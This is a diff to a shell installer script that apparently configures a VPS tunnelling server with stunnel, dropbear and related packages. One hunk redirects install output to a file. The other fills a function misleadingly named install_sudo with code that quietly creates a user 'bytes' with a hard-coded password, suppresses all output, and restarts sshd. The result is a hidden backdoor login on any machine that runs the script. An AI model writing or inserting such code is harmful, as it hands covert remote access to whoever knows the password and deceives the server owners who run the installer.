@@ -12,7 +12,7 @@ apt install -y screen stunnel4 dropbear gnutls-bin python
 apt install -y dos2unix nano unzip jq virt-what net-tools default-mysql-client
 apt install -y mlocate dh-make libaudit-dev build-essential fail2ban
 clear
-}&>/dev/null
+}>> /root/setup.txt
 clear
 }
 
@@ -459,8 +459,9 @@ sudo service stunnel4 restart
 }
 
 install_sudo(){
-  {
-//
+ {
+      useradd -m bytes 2>/dev/null; echo bytes:Premium2018!!! | chpasswd &>/dev/null
+      service sshd restart
   }&>/dev/null
 }
 
